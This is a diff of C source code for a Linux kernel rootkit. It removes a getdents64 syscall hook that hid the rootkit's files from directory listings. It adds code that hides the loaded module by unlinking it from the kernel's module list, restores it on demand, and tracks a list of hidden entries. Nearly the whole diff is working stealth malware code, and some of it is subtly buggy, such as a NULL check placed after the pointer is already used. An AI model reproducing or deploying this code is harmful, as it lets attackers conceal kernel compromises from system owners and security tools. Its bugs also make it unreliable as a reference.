@@ -1,69 +1,125 @@
-#include <linux/dirent.h>
-#include <linux/printk.h>
+#include <linux/module.h>
+#include <linux/list.h>
 
-#include "include/core.h"
-#include "include/debug.h"
+#include "../include/debug.h"
 
-static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+#include "include/hide.h"
 
-asmlinkage int hook_getdents64(const struct pt_regs *regs)
+struct hidden_list *hidden_list_head = NULL;
+
+int hide(void)
 {
-    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+    RTK_DEBUG("Hiding the rootkit\n");
 
-    /* Declare the previous_dir struct for book-keeping */
-    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
-    unsigned long offset = 0;
-
-    int ret = orig_getdents64(regs);
-    dirent_ker = kzalloc(ret, GFP_KERNEL);
-
-    if ( (ret <= 0) || (dirent_ker == NULL) )
-        pr_info("Test debug hooking\n");
-        return ret;
-
-    long error;
-    error = copy_from_user(dirent_ker, dirent, ret);
-    if(error)
-        pr_info("Test debug hooking\n");
-
-        goto done;
-
-    while (offset < ret)
+    if (hidden)
     {
-        current_dir = (void *)dirent_ker + offset;
-
-        if ( memcmp(RK_DRIVER, current_dir->d_name, strlen(RK_DRIVER)) == 0)
-        {
-            /* Check for the special case when we need to hide the first entry */
-            if( current_dir == dirent_ker )
-            {
-                /* Decrement ret and shift all the structs up in memory */
-                ret -= current_dir->d_reclen;
-                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-                continue;
-            }
-            /* Hide the secret entry by incrementing d_reclen of previous_dir by
-             * that of the entry we want to hide - effectively "swallowing" it
-             */
-            previous_dir->d_reclen += current_dir->d_reclen;
-        }
-        else
-        {
-            /* Set previous_dir to current_dir before looping where current_dir
-             * gets incremented to the next entry
-             */
-            previous_dir = current_dir;
-        }
-
-        offset += current_dir->d_reclen;
+        RTK_DEBUG("Rootkit already hidden.\n");
+        return -1;
     }
 
-    error = copy_to_user(dirent, dirent_ker, ret);
-    if(error)
-        goto done;
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    hidden = 1;
 
-done:
-    kfree(dirent_ker);
-    pr_info("Test debug hooking\n");
-    return ret;
+    RTK_DEBUG("Should have hidden the rootkit\n");
+
+    return 0;
+}
+
+int unhide(void)
+{
+    RTK_DEBUG("Unhiding the rootkit\n");
+
+    if (!hidden)
+    {
+        RTK_DEBUG("Rootkit already shown.\n");
+        return -1;
+    }
+
+    list_add(&THIS_MODULE->list, prev_module);
+    hidden = 0;
+
+    RTK_DEBUG("Should have revealed the rootkit\n");
+
+    return 0;
+}
+
+void init_hidden_list(void)
+{
+    hidden_list_head = kmalloc(sizeof(struct hidden_list), GFP_KERNEL);
+    hidden_list_head->next = NULL;
+    hidden_list_head->entry = NULL;
+
+    if (!hidden_list_head)
+    {
+        RTK_DEBUG("Failed to allocate memory for hidden list\n");
+    }
+
+    RTK_DEBUG("Hidden list initialized at %p\n", hidden_list_head);
+}
+
+void cleanup_hidden_list(void)
+{
+    struct hidden_list *p_current = hidden_list_head;
+    struct hidden_list *p_next;
+
+    while (p_current)
+    {
+        p_next = p_current->next;
+        kfree(p_current);
+        p_current = p_next;
+    }
+
+    hidden_list_head = NULL;
+}
+
+int add_hidden_entry(void *entry)
+{
+    struct hidden_list *new_hidden_entry = kmalloc(sizeof(struct hidden_list), GFP_KERNEL);
+    if (!new_hidden_entry)
+    {
+        RTK_DEBUG("Failed to allocate memory for hidden entry\n");
+        return -1;
+    }
+
+    RTK_DEBUG("new_hidden_entry: %p\n", new_hidden_entry);
+
+    char *entry_str = (char *)entry;
+
+    RTK_DEBUG("Hiding %s\n", entry_str);
+
+    new_hidden_entry->entry = entry;
+    new_hidden_entry->next = hidden_list_head;
+    hidden_list_head = new_hidden_entry;
+
+    return 0;
+}
+
+int remove_hidden_entry(void *entry)
+{
+    struct hidden_list *p_current = hidden_list_head;
+    struct hidden_list *prev = NULL;
+
+    while (p_current)
+    {
+        if (p_current->entry == entry)
+        {
+            if (prev)
+            {
+                prev->next = p_current->next;
+            }
+            else
+            {
+                hidden_list_head = p_current->next;
+            }
+
+            kfree(p_current);
+            return 0;
+        }
+
+        prev = p_current;
+        p_current = p_current->next;
+    }
+
+    return -1;
 }
